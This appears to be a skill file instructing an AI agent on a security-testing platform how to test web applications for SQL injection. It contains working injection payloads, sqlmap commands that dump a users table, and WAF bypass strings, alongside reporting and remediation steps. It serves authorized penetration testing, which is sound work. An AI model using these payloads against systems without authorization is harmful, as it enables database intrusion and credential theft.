---
name: sql-injection-testing
description: Professional skills and methodology for SQL injection testing
version: 1.0.0
---

# SQL Injection Testing Skill

## Overview

SQL injection is a common and dangerous web application vulnerability. This skill provides systematic testing methods, detection techniques, and exploitation strategies.

## Testing Methods

### 1. Identify Parameters
- Identify all user input points: URL parameters, POST data, HTTP headers, cookies, etc.
- Focus on parameters such as id, search, filter, and sort
- Intercept and modify requests with Burp Suite or similar tools

### 2. Basic Detection
- Single quote test: `'` - Check for SQL errors
- Boolean-based blind injection: `' AND '1'='1` vs `' AND '1'='2`
- Time-based blind injection: `' AND SLEEP(5)--`
- UNION query: `' UNION SELECT NULL--`

### 3. Identify the Database
- MySQL：`' AND @@version LIKE '%mysql%'--`
- PostgreSQL：`' AND version() LIKE '%PostgreSQL%'--`
- MSSQL：`' AND @@version LIKE '%Microsoft%'--`
- Oracle：`' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Extract Information
- Database name: `' UNION SELECT database()--`
- Table names: `' UNION SELECT table_name FROM information_schema.tables--`
- Column names: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Data extraction: `' UNION SELECT username,password FROM users--`

## Tools

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Specify parameters
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# Specify the database type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# List databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Retrieve tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Retrieve data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Manual Testing
- Use Burp Suite Repeater
- Use browser developer tools
- Write Python scripts to automate testing

## Bypass Techniques

### WAF Bypass
- Encoding: URL, Unicode, hexadecimal
- Comments: `/**/`, `--`, `#`
- Mixed case: `SeLeCt`, `UnIoN`
- Space substitution: `/**/`, `+`, `%09` (Tab), `%0A` (newline)

### Examples
```
Original: ' UNION SELECT NULL--
Bypass 1: '/**/UNION/**/SELECT/**/NULL--
Bypass 2: '%55nion%20select%20null--
Bypass 3: '/*!UNION*//*!SELECT*/null--
```

## Verification and Reporting

### Verification Steps
1. Confirm that SQL statements can execute
2. Extract database information for verification
3. Assess impact (data disclosure, privilege escalation, etc.)
4. Record the complete PoC (request/response)
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials
- Vulnerability location and parameters
- Affected data and systems
- Complete exploitation steps
- Remediation guidance (parameterized queries, input validation, etc.)

## Considerations

- Test only in authorized environments
- Avoid damaging production data
- Use dangerous operations such as DROP and DELETE cautiously
- Record all testing steps for reproduction
